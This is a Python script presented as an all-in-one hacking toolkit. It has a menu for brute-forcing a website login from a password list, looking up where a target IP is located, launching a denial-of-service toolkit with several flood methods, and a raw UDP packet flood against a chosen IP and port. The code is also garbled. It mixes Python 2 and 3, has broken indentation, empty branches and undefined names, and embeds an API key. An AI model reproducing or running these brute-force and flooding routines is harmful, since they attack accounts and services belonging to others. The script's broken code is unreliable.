#!/bin/python3

# ANSI colors (FG & BG)
from datetime import datetime
import random
import socket
import argparse
import json
import urllib2
import os
import sys
import time
import requests
from secrets import choice


RED = "$(printf '\033[31m')"
GREEN = "$(printf '\033[32m')"
ORANGE = "$(printf '\033[33m')"
BLUE = "$(printf '\033[34m')"
MAGENTA = "$(printf '\033[35m')"
CYAN = "$(printf '\033[36m')"
WHITE = "$(printf '\033[37m')"
BLACK = "$(printf '\033[30m')"
REDBG = "$(printf '\033[41m')"
GREENBG = "$(printf '\033[42m')"
ORANGEBG = "$(printf '\033[43m')"
BLUEBG = "$(printf '\033[44m')"
MAGENTABG = "$(printf '\033[45m')"
CYANBG = "$(printf '\033[46m')"
WHITEBG = "$(printf '\033[47m')"
BLACKBG = "$(printf '\033[40m')"
RESETBG = "$(printf '\e[0m\n')"

print("""${GREEN}

      _/_/        _/       _/                                          _/_/_/_/_/                               _/
   _/    _/      _/       _/                     _/_/       _/    _/      _/            _/_/        _/_/       _/
  _/_/_/_/      _/       _/     _/_/_/_/_/    _/_/_/_/       _/_/        _/          _/    _/    _/    _/     _/
 _/    _/      _/       _/                   _/           _/    _/      _/          _/    _/    _/    _/     _/
_/    _/      _/       _/                     _/_/_/     _/    _/      _/            _/_/        _/_/       _/

                                                 ${RED}Version : 1.0
       ${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by AeX03 ${WHITE}
                                                               https://github.com/AeX03/All-exTool
""")

print('\n')
  # Agreement Message #
  warningchoice = input("                   
                        Will you use this responsibly (\033[94;1my\033[93;1m/\033[91mn\033[93;1m): ")

   if warningchoice == 'y':
        pass
    elif warningchoice == 'yes':
        pass
    elif warningchoice == 'Y':
        pass
    elif warningchoice == 'Yes':
        pass
    else:
        endMessage()

print("\n\n${WHITE}[1] ${RED} Social URL Hack (BruteForce)\n ${WHITE}[2] ${GREEN} eLys BotNet ${WHITE}(${RED}being created${WHITE})\n ${WHITE}[3] ${BLEU}Social Bot\n ${WHITE}[4] ${CYAN} Ip Track\n ${WHITE}[5] ${ORANGE} Impulse\n ${WHITE}[6] ${MAGENTA} DDOS\n ${WHITE}[7] ${GREEN} Thanks too")
choice = input('\n Choice')

if Choice == '1':

print(""" 
 @@@@@@  @@@@@@   @@@@@@@ @@@  @@@@@@  @@@         @@@  @@@ @@@@@@@  @@@         @@@  @@@  @@@@@@   @@@@@@@ @@@  @@@ 
!@@     @@!  @@@ !@@      @@! @@!  @@@ @@!         @@!  @@@ @@!  @@@ @@!         @@!  @@@ @@!  @@@ !@@      @@!  !@@ 
 !@@!!  @!@  !@! !@!      !!@ @!@!@!@! @!!         @!@  !@! @!@!!@!  @!!         @!@!@!@! @!@!@!@! !@!      @!@@!@!  
    !:! !!:  !!! :!!      !!: !!:  !!! !!:         !!:  !!! !!: :!!  !!:         !!:  !!! !!:  !!! :!!      !!: :!!  
::.: :   : :. :   :: :: : :    :   : : : ::.: :     :.:: :   :   : : : ::.: :     :   : :  :   : :  :: :: :  :   :::                                                          

""")

z = """     
                       Checking the Server !!
        
        [+]█████████████████████████████████████████████████[+]
"""


url = input("Enter Url: ")
username = input("Enter Username: ")
error = input("Enter Wrong Password Error Message: ")

for c in z:
    sys.stdout.write(c)
    sys.stdout.flush()
    time.sleep(0.02)

try:
    def bruteCracking(username, url, error):
        count = 0
        for password in passwords:
            password = password.strip()
            count = count + 1
            print("Trying Password: " + str(count) + ' Time For => ' + password)
            data_dict = {"LogInID": username, "Password": password, "Log In":"submit"}
            response = requests.post(url, data=data_dict)
            if error in str(response.content):
                pass
            elif "CSRF" or "csrf" in str(response.content):
                print("CSRF Token Detected!! BruteF0rce Not Working This Website.")
                exit()
            else:
                print("Username: ---> " + username)
                print("Password: ---> " + password)
                exit()
except:
    print("Some Error Occurred Please Check Your Internet Connection !!")

with open("passwords.txt", "r") as passwords:
    bruteCracking(username, url, error)

print("[!!] password not in list")

else:
    exit()

if Choice == '2':

else:
      exit()

if Choice == '3':

else:
      exit()

if Choice == '4':

   # For your own IP Coding
url = "http://ip-api.com/json/"
load1 = urllib2.urlopen(url)
read1 = load1.read()
result1 = json.loads(read1)
os.system('clear')
print('''
 _____  ______        _______  ______            ______  _    _ 
(_____)(_____ \      (_______)(_____ \    /\    / _____)| |  / )
   _    _____) ) ___  _        _____) )  /  \  | /      | | / / 
  | |  |  ____/ (___)| |      (_____ (  / /\ \ | |      | |< <  
 _| |_ | |           | |_____       | || |__| || \_____ | | \ \ 
(_____)|_|            \______)      |_||______| \______)|_|  \_)
                                                                
''')
print("\n\033[1;33mYour IP: \033[1;33m" + result1['query'])
print("\033[1;32mIf You Do Not Want To Track Type Exit\033[1;32m\n")

while True:
    ip = raw_input("\033[1;36mEnter Your Target IP: \033[1;36m")

    if ip == 'exit':
        break
    else:
        # ips Coding
        api = "http://api.ipstack.com/"
        load = urllib2.urlopen(
            api + ip + '?access_key=fd0c1eae3c2d27ee676af0db2b864b0e')
        read = load.read()
        result = json.loads(read)

        # ip-api
        url = "http://ip-api.com/json/"
        load1 = urllib2.urlopen(url + ip)
        read1 = load1.read()
        result1 = json.loads(read1)

        if result1['status'] == 'success':
            # latitude
            lati = result['latitude']
            lat = "{:.4f}".format(lati)
            # longitude
            lon = result['longitude']
            long = "{:.4f}".format(lon)

            # more info
            more = json.dumps(result['location'])

            # printing information
            print(
               "\n\033[1;33mAll The Information Of IP Is Here \033[1;33m[" + ip + "] :\n")
            print("\033[1;33mIP: \033[1;33m" + result['ip'])
            print("\033[1;32mIP Type: \033[1;32m" + result['type'])
            print("\033[1;34mContinent Name: \033[1;34m" + \
                  result['continent_name'])
            print("\033[1;34mContinent Code: \033[1;34m" + \
                  result['continent_code'])
            print("\033[1;33mCountry: \033[1;33m" + result['country_name'])
            print("\033[1;33mCountry Code: \033[1;33m" + \
                  result1['countryCode'])
            print("\033[1;32mRegion Name: \033[1;32m" + result['region_name'])
            print("\033[1;32mRegion Code: \033[1;32m" + result['region_code'])
            print("\033[1;36mCity: \033[1;36m" + result['city'])
            print("\033[1;36mZip: \033[1;36m" + result['zip'])
            print("\033[1;33mTimeZone: \033[1;33m" + result1['timezone'])
            print("\033[1;33misp: \033[1;33m" + result1['isp'])
            print("Do you want to find the exact location with Google Maps?")
            print("Then search the Google Map using the Latitude or longitude number")
            print("\033[1;36mLatitude: \033[1;36m" + lat)
            print("\033[1;36mlongitude: \033[1;36m" + long)
            print("\033[1;33mMore Information Of IP \033[1;33m:\n" + more)
            print("\n\n")
        else:
            print("\n\033[1;31mSorry, Please Type The IP[" + \
                  ip + "] Please try again\033[1;31m\n")

else:
    exit()

if Choice == '5':

    # Import modules

   # Go to current dir
os.chdir(os.path.dirname(os.path.realpath(__file__)))

try:
    from tools.crash import CriticalError
    import tools.addons.clean
    import tools.addons.logo
    import tools.addons.winpcap
    from tools.method import AttackMethod
except ImportError as err:
    CriticalError("Failed import some modules", err)
    sys.exit(1)

# Parse args
parser = argparse.ArgumentParser(description="Denial-of-service ToolKit")
parser.add_argument(
    "--target",
    type=str,
    metavar="<IP:PORT, URL, PHONE>",
    help="Target ip:port, url or phone",
)
parser.add_argument(
    "--method",
    type=str,
    metavar="<SMS/EMAIL/NTP/UDP/SYN/ICMP/POD/SLOWLORIS/MEMCACHED/HTTP>",
    help="Attack method",
)
parser.add_argument(
    "--time", type=int, default=10, metavar="<time>", help="time in secounds"
)
parser.add_argument(
    "--threads", type=int, default=3, metavar="<threads>", help="threads count (1-200)"
)

# Get args
args = parser.parse_args()
threads = args.threads
time = args.time
method = str(args.method).upper()
target = args.target


if __name__ == "__main__":
    # Print help
    if not method or not target or not time:
        parser.print_help()
        sys.exit(1)

    # Run ddos attack
    with AttackMethod(
        duration=time, name=method, threads=threads, target=target
    ) as Flood:
        Flood.Start()
else:
      exit()

if Choice == '6':

   # Code Time
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos")
ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet Attack Starting")
print "[                    ] 0% "
time.sleep(5)
print "[=====               ] 25%"
time.sleep(5)
print "[==========          ] 50%"
time.sleep(5)
print "[===============     ] 75%"
time.sleep(5)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
    sock.sendto(bytes, (ip, port))
    sent = sent + 1
    port = port + 1
    print "Sent %s packet to %s throught port:%s"%(sent, ip, port)
    if port == 65534:
        port = 1

else:
      exit()

if Choice == '7':
      print("""
      Creator : AeX03
      Maintainer :
      """)

else:
      exit()

print('${RED} Invalid Choice')
